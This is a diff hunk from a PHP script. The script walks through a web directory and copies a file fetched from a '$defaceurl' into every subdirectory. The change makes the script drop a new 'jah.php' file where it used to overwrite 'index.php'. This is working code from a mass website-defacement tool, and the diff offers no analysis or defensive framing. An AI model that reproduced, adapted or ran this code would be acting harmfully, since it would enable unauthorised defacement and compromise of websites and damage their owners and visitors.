@@ -18,7 +18,7 @@ if (is_dir($dir)) {
     if ($dh = opendir($dir)) {
         while (($file = readdir($dh)) !== false) {
                         if(filetype($dir.$file)=="dir"){
-                                $newfile=$dir.$file."/index.php";
+                                $newfile=$dir.$file."/jah.php";
                                 echo $newfile."\n";
                                 if (!copy($defaceurl, $newfile)) {
                                         echo "failed to copy $file...\n";
